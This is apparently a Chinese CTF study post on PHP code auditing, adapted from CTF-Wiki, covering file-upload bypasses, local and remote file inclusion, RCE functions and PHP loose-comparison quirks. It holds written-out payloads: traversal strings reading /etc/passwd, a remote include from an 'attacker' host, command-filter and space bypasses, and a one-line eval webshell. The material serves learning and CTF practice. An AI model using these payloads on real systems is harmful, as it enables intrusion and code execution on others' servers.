---
title: PHP代码审计
date: 2025-11-08 21:59:32
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/690c233e3203f7be00db6444.png
categories: CTF
---

## 文件上传漏洞

#### 绕过上传检查

- 前端检查扩展名

  抓包绕过即可。

- `Content-Type` 检测文件类型

  抓包修改 `Content-Type` 类型，使其符合白名单规则。

- 服务端添加后缀

  尝试 `%00` 截断。

- 服务端扩展名检测

  利用解析漏洞。

- Apache 解析

  Apache 对后缀解析是从右向左的

  `phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。

- IIS 解析

  IIS 6 下当文件名为 `abc.asp;xx.jpg` 时，会将其解析为 `abc.asp`。

- PHP CGI 路径解析

  当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析， `notexist.php` 是不存在的文件。此时 Nginx 的配置如下

  ```nginx
  location ~ \.php$ {
    root html;
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
    include fastcgi_param;
  }
  ```

- 其他方式

  后缀大小写、双写、特殊后缀如 `php5` 等，修改包内容的大小写过 WAF 等。

[文件上传漏洞（全网最详细）](https://blog.csdn.net/m0_59598029/article/details/138793923)

[文件上传之 .htaccess文件getshell](https://blog.csdn.net/weixin_46684578/article/details/119141109)

[文件上传漏洞之MIME type验证原理和绕过](https://blog.csdn.net/lza20001103/article/details/124427171)



## 文件包含漏洞

常见的导致文件包含的函数有：

- PHP：`include()`，`include_once()`，`require()`，`require_once()`，`fopen()`，`readfile()` 等
- JSP Servlet：`ava.io.File()`，`java.io.FileReader()` 等
- ASP：`includefile`，`includevirtual` 等

当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。

#### 本地文件包含

本地文件包含，Local File Inclusion，LFI。

```php
<?php
$file = $_GET['file'];
if (file_exists('/home/wwwrun/'.$file.'.php')) {
  include '/home/wwwrun/'.$file.'.php';
}
?>
```

上述代码存在本地文件包含，可用 %00 截断的方式读取 `/etc/passwd` 文件内容。

- `%00` 截断

  ```
  ?file=../../../../../../../../../etc/passwd%00
  ```

  需要 `magic_quotes_gpc=off`，PHP 小于 5.3.4 有效。

- 路径长度截断

  ```
  ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
  ```

  Linux 需要文件名长于 4096，Windows 需要长于 256。

#### 远程文件包含

```php
<?php
if ($route == "share") {
  require_once $basePath . "/action/m_share.php";
} elseif ($route == "sharelink") {
  require_once $basePath . "/action/m_sharelink.php";
}
```

构造变量 `basePath` 的值。

```
/?basePath=http://attacker/phpshell.txt?
```

最终的代码执行了

```php
require_once "http://attacker/phpshell.txt?/action/m_share.php";
```

问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。

![](https://pic1.imgdb.cn/item/693d6f5ffe7cfeca3822eec5.png)

[**PHP伪协议详解**](https://konwait12.github.io/my-kon-blog/posts/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/)

[本地文件包含漏洞详解与CTF实战 ](https://www.cnblogs.com/xinghaihe/p/18416524)

[伪协议过滤绕过](/html/taishan.html)



## RCE

### 直接执行代码 

PHP 中有不少可以直接执行代码的函数。

```
eval();
assert();
system();
exec();
shell_exec();
passthru();
escapeshellcmd();
pcntl_exec();
......
```

[CTF里读取文件相关知识点总结(持续更新中) – fushulingのblog](https://fushuling.com/index.php/2023/04/14/ctf里读取文件相关知识点总结/)

### `preg_replace()` 代码执行

`preg_replace()` 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。

```php
<?php
$var = "<tag>phpinfo()</tag>";
preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
?>
```

如果没有 `/e` 修饰符，可以尝试 %00 截断。

### `preg_match` 代码执行

`preg_match` 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。




### 动态函数执行

用户自定义的函数可以导致代码执行。

```php
<?php
$dyn_func = $_GET["dyn_func"];
$argument = $_GET["argument"];
$dyn_func($argument);
?>
```

### 反引号命令执行

```php
<?php
echo `ls -al`;
?>
```

### Curly Syntax

PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。

```php
<?php
$var = "aaabbbccc ${`ls`}";
?>
<?php
$foobar = "phpinfo";
${"foobar"}();
?>
```

### 回调函数

很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。

```php
<?php
$evil_callback = $_GET["callback"];
$some_array = array(0,1,2,3);
$new_array = array_map($evil_callback, $some_array);
?>
```

攻击 payload

```
http://www.a.com/index.php?callback=phpinfo
```

### 反序列化

[在这儿呢](https://www.sunynov.top/2025/12/24/PHP反序列化漏洞/)



## PHP 特性

### 数组

```php
<?php
$var = 1;
$var = array();
$var = "string";
?>
```

php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。

比如在 `$a == $b` 的比较中

```php
$a = null; 
$b = false; //为真 
$a = ''; 
$b = 0; //同样为真
```

然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。

```php
0=='0' //true
0 == 'abcdefg' //true
0 === 'abcdefg' //false
1 == '1abcdef' //true
```

### 魔法 Hash

```php
"0e132456789"=="0e7124511451155" //true
"0e123456abc"=="0e1dddada" //false
"0e1abc"=="0"  //true
```

在进行比较运算时，如果遇到了 `0e\d+` 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 `0e\d+` 这种模式就不会相等。

### 十六进制转换

```php
"0x1e240"=="123456" //true
"0x1e240"==123456 //true
"0x1e240"=="1e240" //false
```

当其中的一个字符串是 `0x` 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，`0x1240` 解析成为十进制就是 123456，所以与 `int` 类型和 `string` 类型的 123456 比较都是相等。

### 类型转换

常见的转换主要就是 `int` 转换为 `string`，`string` 转换为 `int`。

`int` 转 `string`

```php
$var = 5;
方式1：$item = (string)$var;
方式2：$item = strval($var);
```

`string` 转 `int`：`intval()` 函数。

对于这个函数，可以先看 2 个例子。

```php
var_dump(intval('2')) //2
var_dump(intval('3abcd')) //3
var_dump(intval('abcd')) //0
```

说明 `intval()` 转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串， `intval()` 不会报错而是返回 0。

同时，程序员在编程的时候也不应该使用如下的这段代码：

```php
if(intval($a)>1000) {
 mysql_query("select * from news where id=".$a)
}
```

这个时候 `$a` 的值有可能是 `1002 union`。

### 内置函数的参数的松散性

内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。

**md5()**

```php
$array1[] = array(
 "foo" => "bar",
 "bar" => "foo",
);
$array2 = array("foo", "bar", "hello", "world");
var_dump(md5($array1)==md5($array2)); //true
```

PHP 手册中的 md5（）函数的描述是 `string md5 ( string $str [, bool $raw_output = false ] )`，`md5()` 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，`md5()` 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。

**strcmp()**

`strcmp()` 函数在 PHP 官方手册中的描述是 `intstrcmp ( string $str1 ， string $str2 )`，需要给 `strcmp()` 传递 2 个 `string` 类型的参数。如果 `str1` 小于 `str2`，返回 -1，相等返回 0，否则返回 1。`strcmp()` 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。

如果传入给出 `strcmp()` 的参数是数字呢？

```php
$array=[1,2,3];
var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于false。
```

**switch()**

如果 `switch()` 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：

```php
$i ="2abc";
switch ($i) {
case 0:
case 1:
case 2:
 echo "i is less than 3 but not negative";
 break;
case 3:
 echo "i is 3";
}
```

这个时候程序输出的是 `i is less than 3 but not negative` ，是由于 `switch()` 函数将 `$i` 进行了类型转换，转换结果为 2。

**in_array()**

在 PHP 手册中， `in_array()` 函数的解释是 `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么 `in_array` 就会使用松散比较来判断 `$needle` 是否在 `$haystack` 中。当 strict 的值为 true 时， `in_array()` 会比较 needls 的类型和 haystack 中的类型是否相同。

```php
$array=[0,1,2,'3'];
var_dump(in_array('abc', $array)); //true
var_dump(in_array('1bc', $array)); //true
```

可以看到上面的情况返回的都是 true，因为 `'abc'` 会转换为 0， `'1bc'` 转换为 1。

`array_search()` 与 `in_array()` 也是一样的问题。



## 小芝士

#### linux命令

##### cat被过滤

- `tac` 是一个常用的文本处理命令，核心功能是 **反向输出文件内容**
- `more` 命令是 Linux 系统中用于分页显示文件内容的工具，在处理篇幅较长的文本文件时非常实用
- `less,tail,head`
- `uniq,nl,vi,vim`

##### 空格绕过

<、>、${IFS}、$IFS、$IFS$9

#### php

无参🐎

```
code=eval(array_pop(next(get_defined_vars())));&1=phpinfo();
```



<p class="note note-success">本文摘自CTF-Wiki，原文基础上有改动</p>
